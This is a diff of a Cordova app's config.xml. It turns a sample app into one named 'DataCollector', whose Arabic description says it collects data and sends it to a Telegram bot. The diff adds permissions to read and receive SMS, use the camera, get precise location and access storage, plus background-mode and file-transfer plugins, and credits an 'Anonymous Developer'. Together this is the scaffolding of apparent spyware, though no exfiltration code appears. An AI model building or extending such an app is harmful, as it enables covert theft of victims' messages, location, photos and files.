@@ -1,43 +1,41 @@
 <?xml version='1.0' encoding='utf-8'?>
-<widget id="com.example.helloworld" version="1.0.0"
-    xmlns="http://www.w3.org/ns/widgets"
-    xmlns:cdv="http://cordova.apache.org/ns/1.0">
-
-  <name>CordovaApp</name>
+<widget id="com.example.datacollector" version="1.0.0" xmlns="http://www.w3.org/ns/widgets" xmlns:cdv="http://cordova.apache.org/ns/1.0">
+  <name>DataCollector</name>
   <description>
-    مثال على تطبيق Cordova يطلب أذونات الملفات، SMS، جهات الاتصال، والموقع.
+    تطبيق لجمع البيانات وإرسالها إلى بوت Telegram
   </description>
-  <author email="dev@example.com">Cordova Developer</author>
+  <author email="dev@example.com">Anonymous Developer</author>
   <content src="index.html" />
   <access origin="*" />
   <preference name="android-targetSdkVersion" value="34" />
-
+  <preference name="KeepRunning" value="true" />
+  
+  <plugin name="cordova-plugin-whitelist" spec="1" />
+  <plugin name="cordova-plugin-geolocation" spec="4.1.0" />
+  <plugin name="cordova-plugin-sms" spec="1.0.5" />
+  <plugin name="cordova-plugin-file" spec="6.0.2" />
+  <plugin name="cordova-plugin-file-transfer" spec="1.7.1" />
+  <plugin name="cordova-plugin-android-permissions" spec="1.1.3" />
+  <plugin name="cordova-plugin-background-mode" spec="0.7.3" />
+  <plugin name="cordova-plugin-camera" spec="4.1.0" />
+  
   <platform name="android">
     <edit-config file="AndroidManifest.xml" mode="merge" target="/manifest">
       <manifest xmlns:android="http://schemas.android.com/apk/res/android">
-        
-        <!-- إذن الوصول للملفات -->
         <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
         <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
-
-        <!-- إذن إرسال الرسائل -->
-        <uses-permission android:name="android.permission.SEND_SMS" />
-
-        <!-- إذن الوصول لجهات الاتصال -->
-        <uses-permission android:name="android.permission.READ_CONTACTS" />
-        <uses-permission android:name="android.permission.WRITE_CONTACTS" />
-
-        <!-- إذن الوصول للموقع -->
+        <uses-permission android:name="android.permission.READ_SMS" />
+        <uses-permission android:name="android.permission.RECEIVE_SMS" />
         <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
         <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
-
-        <!-- إذن الوصول للصور (جزء من إذن الملفات) -->
-        <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
-        <uses-permission android:name="android.permission.READ_MEDIA_VIDEO" />
-        <uses-permission android:name="android.permission.READ_MEDIA_AUDIO" />
-
+        <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+        <uses-permission android:name="android.permission.CAMERA" />
+        <uses-permission android:name="android.permission.INTERNET" />
+        
+        <application>
+          <service android:name="org.apache.cordova.background.BackgroundPlugin$BackgroundService" />
+        </application>
       </manifest>
     </edit-config>
   </platform>
-
 </widget>
